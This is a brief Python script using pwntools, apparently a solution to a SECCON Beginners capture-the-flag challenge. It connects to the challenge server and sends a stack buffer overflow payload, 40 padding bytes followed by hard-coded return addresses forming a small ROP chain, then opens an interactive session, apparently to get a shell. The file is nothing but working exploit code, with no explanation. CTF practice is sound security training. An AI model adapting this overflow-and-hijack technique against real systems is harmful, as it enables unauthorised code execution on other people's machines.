
from pwn import *

def main():
    conn = remote("bs.quals.beginners.seccon.jp", 9001)

    code="a"*40+"\x5f\x08\x40\x00\x00\x00\x00\x00\x10\x0a\x40\x00\x00\x00\x00\x00\x62\x08\x40\x00\x00\x00\x00\x00"
    payload = code
    conn.send(payload)
    conn.interactive()


if __name__ == "__main__":
    main()

